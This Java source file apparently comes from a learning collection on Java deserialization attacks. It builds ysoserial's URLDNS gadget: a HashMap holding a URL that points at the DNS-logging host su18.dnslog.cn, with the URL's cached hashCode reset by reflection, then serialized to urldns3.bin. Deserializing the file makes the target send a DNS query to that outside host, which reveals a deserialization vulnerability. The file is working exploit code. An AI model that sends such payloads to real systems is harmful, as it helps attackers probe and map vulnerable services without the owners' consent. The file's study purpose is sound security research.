package org.su18.serialize.ysoserial.URLDNS;

import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.io.IOException;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

/**
 * ysoserial 的实现方式，通过注册一个自定义的 URLStreamHandler
 * 在实例化 URL 对象的时候传入，避免触发 DNS 查询
 *
 * @author su18
 */
public class URLDNS3 {

	public static String fileName = "urldns3.bin";

	static class SilentURLStreamHandler extends URLStreamHandler {

		@Override
		protected URLConnection openConnection(URL u) throws IOException {
			return null;
		}

		@Override
		protected synchronized InetAddress getHostAddress(URL u) {
			return null;
		}
	}

	public static void main(String[] args) throws Exception {

		URLStreamHandler      handler = new SilentURLStreamHandler();
		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL                   url     = new URL(null, "http://su18.dnslog.cn", handler);
		hashMap.put(url, 0);

		Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);
		f.set(url, -1);

		SerializeUtil.writeObjectToFile(hashMap, fileName);
		SerializeUtil.readFileObject(fileName);
	}

}
